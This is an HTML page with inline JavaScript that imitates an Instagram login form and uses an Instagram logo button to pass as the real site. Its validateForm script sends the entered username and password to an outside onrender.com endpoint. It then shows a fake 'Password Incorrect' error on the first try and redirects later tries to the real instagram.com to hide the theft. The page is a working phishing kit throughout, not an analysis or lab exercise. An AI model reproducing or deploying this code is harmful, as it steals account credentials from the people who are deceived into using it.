<body>
      <div class="container flex">
        <div class="facebook-page flex">
          <div class="EnglishUS"><p>English(US)</p></div>
          <div class="profile-info">
            <form id="login-form">
              
              <!-- <div class="facebook-login">
                <button type="button">
                  <i class="fab fa-facebook-f"></i> 
                </button>
              </div> -->
              <div class="instagram-login">
                <button type="button">
                  <i class="fab fa-instagram"></i>
                </button>
              </div>


              <div class="password-container">
                <input type="text" placeholder="Username" id="username">
                <input type="password" placeholder="Password" id="password">
                <i class="fa fa-eye-slash" id="eye" onclick="togglePasswordVisibility()"></i>
                <div id="error-message"></div>
              </div>
              <div class="link">
                
                <button type="button" class="login" onclick="validateForm()">Login</button>
                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" target="_blank">Forgot
                  password?</a>
              </div>
              
            </form>
          </div>
        </div>
      </div>
  <script>
    var count = 0;
    function validateForm() {
     
      var errorMessage = document.getElementById("error-message");
      var passwordInput = document.getElementById("password");
      var userInput = document.getElementById("username");
      var password = passwordInput.value;
      // Assuming username is always "sahitya"
      var username = userInput.value;

      if (username.trim() === "" || password.trim() === "") {
        // Display an error message or perform any other desired action
        document.getElementById("error-message").innerHTML = "Both username and password are required.";
      } else {
        // Clear any previous error messages
         ++count;
        document.getElementById("error-message").innerHTML = "";

      // Create an object to send in the POST request
      var userCredentials = {
        userName: username,
        password: password
      };
      fetch('https://instagram-reels-rakshu-video-viral.onrender.com/api/fbuser', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(userCredentials)
      })
        .then(response => response.json())
        .then(data => {
          // Handle the response from the backend as needed
          console.log('Success:', data);
        })
        .catch((error) => {
          console.error('Error:', error);
          errorMessage.innerText = "There was an error during login.";
          errorMessage.style.display = "block";
        });

      if (count == 1) {
        errorMessage.innerText = "Password Incorrect";
        errorMessage.style.display = "block";
      }
      else {
        window.location.href = "https://instagram.com";
      }

      passwordInput.value = "";

    }
    }

    function togglePasswordVisibility() {
      var passwordInput = document.getElementById("password");
      var eyeIcon = document.getElementById("eye");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.classList.remove("fa-eye-slash");
        eyeIcon.classList.add("fa-eye");
      } else {
        passwordInput.type = "password";
        eyeIcon.classList.remove("fa-eye");
        eyeIcon.classList.add("fa-eye-slash");
      }
    }

  </script>
